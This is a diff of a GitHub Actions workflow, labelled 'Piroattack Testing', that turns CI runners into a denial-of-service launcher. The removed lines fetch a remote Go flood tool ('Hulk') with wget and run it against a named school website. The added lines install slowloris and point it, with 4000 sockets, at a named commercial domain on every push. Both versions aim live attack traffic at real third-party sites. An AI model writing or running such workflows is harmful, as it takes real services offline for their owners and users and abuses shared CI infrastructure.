@@ -1,19 +1,27 @@
-name: Run Hulk
+name: Piroattack Testing
 
-on: [push, pull_request]
+on:
+  push:
+    branches:
+      - pypi
 
 jobs:
-  build:
+  test:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Set up Go
-      uses: actions/setup-go@v2
-      with:
-        go-version: 1.17
+    - name: Checkout repository
+      uses: actions/checkout@v2
 
-    - name: Download Hulk
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.8
+
+    - name: Install dependencies
       run: |
-        wget https://raw.githubusercontent.com/hk4crprasad/hk4crprasad/master/piro.go
-        go mod init piro
-        go run piro.go --site https://skasc.myklassroom.com
+        pip install slowloris
+
+    - name: Run piroattack
+      run: |
+        slowloris ultramall.in -s 4000
